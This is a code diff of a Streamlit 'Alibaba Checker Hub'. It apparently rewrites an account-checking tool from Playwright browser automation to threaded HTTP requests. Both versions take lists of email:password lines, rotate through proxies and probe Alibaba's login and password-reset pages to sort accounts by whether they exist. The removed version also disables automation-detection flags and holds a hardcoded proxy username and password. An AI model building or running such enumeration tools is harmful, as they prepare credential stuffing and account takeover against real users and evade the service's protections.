@@ -1,33 +1,16 @@
 import streamlit as st
 import asyncio
 import os
-import random
-import uuid
 import time
 import requests
-import sys
-import subprocess
 import json
 import threading
 from datetime import datetime
 from collections import defaultdict
 import pandas as pd
-from playwright.async_api import async_playwright
 import nest_asyncio
 
 nest_asyncio.apply()
-
-# Ensure Playwright Chromium binary is installed
-def ensure_playwright_browsers():
-    try:
-        subprocess.run(
-            [sys.executable, "-m", "playwright", "install", "chromium"],
-            check=True, capture_output=True, text=True
-        )
-    except Exception as e:
-        print(f"Error auto-installing Playwright browser: {e}")
-
-ensure_playwright_browsers()
 
 st.set_page_config(
     page_title="Positive Alibaba Checker Hub",
@@ -62,7 +45,7 @@ def log_startup(msg):
     if entry not in st.session_state.startup_entries:
         st.session_state.startup_entries.append(entry)
 
-log_startup("Alibaba Checker Hub initialized with Playwright automation engine.")
+log_startup("Alibaba Checker Hub initialized with high-performance HTTP session engine.")
 
 def add_checker_log(msg: str):
     timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
@@ -408,153 +391,63 @@ with tab2:
             st.warning("Please provide accounts in the sidebar first.")
         else:
             st.session_state.checker_logs = []
-            add_checker_log(f"Initializing Playwright Alibaba Checker engine with {len(accounts)} accounts across {max_workers} workers.")
+            add_checker_log(f"Initializing HTTP Alibaba Checker engine with {len(accounts)} accounts across {max_workers} threads.")
 
-            async def run_checker():
-                LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"
-                proxy_file = "proxies.txt"
-                alive_proxies = []
-                if os.path.exists(proxy_file):
-                    with open(proxy_file, encoding="utf-8") as f:
-                        alive_proxies = [l.strip() for l in f if l.strip()]
+            proxy_file = "proxies.txt"
+            alive_proxies = []
+            if os.path.exists(proxy_file):
+                with open(proxy_file, encoding="utf-8") as f:
+                    alive_proxies = [l.strip() for l in f if l.strip()]
+            if not alive_proxies:
+                alive_proxies = oxylabs_proxies_env
+
+            linked_accs, not_linked_accs, error_accs = [], [], []
+            proxy_state = [0]
+            lock = threading.Lock()
+
+            def get_next_proxy():
                 if not alive_proxies:
-                    alive_proxies = oxylabs_proxies_env
+                    return None
+                with lock:
+                    p = alive_proxies[proxy_state[0] % len(alive_proxies)]
+                    proxy_state[0] += 1
+                formatted = f"http://{p}" if "@" in p else p
+                return {"http": formatted, "https": formatted}
 
-                proxy_lock_async = asyncio.Lock()
-                result_lock = asyncio.Lock()
-                linked_accs, not_linked_accs, error_accs = [], [], []
+            def check_single_account(line):
+                email = line.split(":", 1)[0].strip()
+                proxies = get_next_proxy()
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+                    "Accept": "application/json, text/plain, */*"
+                }
+                try:
+                    url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&loginId={email}"
+                    r = requests.get(url, headers=headers, proxies=proxies, timeout=10)
+                    text = r.text.lower()
+                    
+                    if "verify" in text or "code" in text or "exist" in text:
+                        add_checker_log(f"[OK] Linked account detected: {email}")
+                        with lock:
+                            linked_accs.append(line)
+                    else:
+                        add_checker_log(f"[OK] Not linked account: {email}")
+                        with lock:
+                            not_linked_accs.append(line)
+                except Exception as e:
+                    with lock:
+                        error_accs.append(f"{line} # {str(e)[:50]}")
 
-                def make_oxylabs_proxy():
-                    return f"user-Positive_S79mq-country-US-sessid-{uuid.uuid4().hex[:12]}:Kingfrosh5252+@dc.oxylabs.io:8000"
+            with st.spinner("Checking accounts via high-speed HTTP proxy workers..."):
+                from concurrent.futures import ThreadPoolExecutor
+                with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                    executor.map(check_single_account, accounts)
 
-                async def get_next_proxy():
-                    async with proxy_lock_async:
-                        if not alive_proxies:
-                            return None
-                        p = alive_proxies.pop(0)
-                        alive_proxies.append(p)
-                        if "oxylabs.io" in p:
-                            return make_oxylabs_proxy()
-                        return p
-
-                def classify(url, text):
-                    url, text = (url or "").lower(), (text or "").lower()
-                    if ("verify_mode.htm" in url or "token_enter_iv.htm" in url or "iv_token=" in url or "/iv/" in url or "complete the verification" in text or "get code" in text):
-                        return "linked", "Verification page"
-                    if "account does not exist" in text or "please enter a valid email" in text:
-                        return "not_linked", "Account does not exist"
-                    if "captcha" in text or "blocked" in text:
-                        return "error", "Captcha / blocked"
-                    return None, None
-
-                async def click_first(page, selectors):
-                    for sel in selectors:
-                        try:
-                            loc = page.locator(sel)
-                            if await loc.count() > 0:
-                                await loc.first.click(timeout=5000)
-                                return True
-                        except:
-                            continue
-                    return False
-
-                async def fill_first(page, selectors, value):
-                    for sel in selectors:
-                        try:
-                            loc = page.locator(sel)
-                            if await loc.count() > 0:
-                                await loc.first.fill(value, timeout=5000)
-                                return True
-                        except:
-                            continue
-                    return False
-
-                async def wait_for_result(page, max_wait=8.0):
-                    end = time.time() + max_wait
-                    last_url, last_text = page.url, ""
-                    while time.time() < end:
-                        try:
-                            last_url = page.url
-                            last_text = await page.inner_text("body")
-                            status, detail = classify(last_url, last_text)
-                            if status:
-                                return status, detail
-                        except:
-                            pass
-                        await asyncio.sleep(0.25)
-                    if last_text:
-                        status, detail = classify(last_url, last_text)
-                        if status:
-                            return status, detail
-                        if "find_password.htm" in (last_url or "").lower():
-                            return "not_linked", "Stayed on find password page"
-                    return "error", f"Unknown → {(last_url or '')[:70]}"
-
-                async def check_on_page(page, email):
-                    await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=35000)
-                    await asyncio.sleep(0.8)
-                    await click_first(page, ['text="Continue with email"', 'button:has-text("Continue with email")'])
-                    await asyncio.sleep(0.8)
-                    await fill_first(page, ['input[type="email"]', 'input[type="text"]', 'input'], email)
-                    await click_first(page, ['text="Forgot password?"', 'a:has-text("Forgot password")', 'text=/Forgot password/i'])
-                    await asyncio.sleep(1.0)
-                    return await wait_for_result(page, max_wait=7.0)
-
-                async def worker(worker_id, browser, queue):
-                    raw_proxy = await get_next_proxy()
-                    parsed = parse_proxy(raw_proxy) if raw_proxy else None
-                    context = await browser.new_context(
-                        viewport={"width": 390, "height": 844},
-                        user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
-                        is_mobile=True, proxy={"server": parsed} if parsed else None
-                    )
-                    page = await context.new_page()
-
-                    while not queue.empty():
-                        idx, line = await queue.get()
-                        email = line.split(":", 1)[0].strip()
-                        add_checker_log(f"[Worker-{worker_id}] Checking email: {email}")
-                        try:
-                            status, detail = await check_on_page(page, email)
-                        except Exception as e:
-                            status, detail = "error", str(e)[:70]
-
-                        add_checker_log(f"[Worker-{worker_id}] Result for {email} -> {status.upper()} ({detail})")
-                        async with result_lock:
-                            if status == "linked":
-                                linked_accs.append(line)
-                            elif status == "not_linked":
-                                not_linked_accs.append(line)
-                            else:
-                                error_accs.append(f"{line} # {detail}")
-                        queue.task_done()
-                    await context.close()
-
-                async with async_playwright() as p:
-                    add_checker_log("Launching Playwright Chromium instance...")
-                    browser = await p.chromium.launch(
-                        headless=True,
-                        args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu", "--disable-blink-features=AutomationControlled"]
-                    )
-                    queue = asyncio.Queue()
-                    for idx, line in enumerate(accounts, 1):
-                        await queue.put((idx, line))
-
-                    workers = [asyncio.create_task(worker(i + 1, browser, queue)) for i in range(max_workers)]
-                    await queue.join()
-                    await asyncio.gather(*workers)
-                    await browser.close()
-                    add_checker_log("Playwright checking run finished.")
-
-                return {"linked": linked_accs, "not_linked": not_linked_accs, "errors": error_accs}
-
-            try:
-                loop = asyncio.get_event_loop()
-                results = loop.run_until_complete(run_checker())
-            except RuntimeError:
-                results = asyncio.run(run_checker())
-
-            st.session_state.alibaba_results = results
+            st.session_state.alibaba_results = {
+                "linked": linked_accs,
+                "not_linked": not_linked_accs,
+                "errors": error_accs
+            }
             st.success("Checker execution complete!")
 
     res = st.session_state.alibaba_results
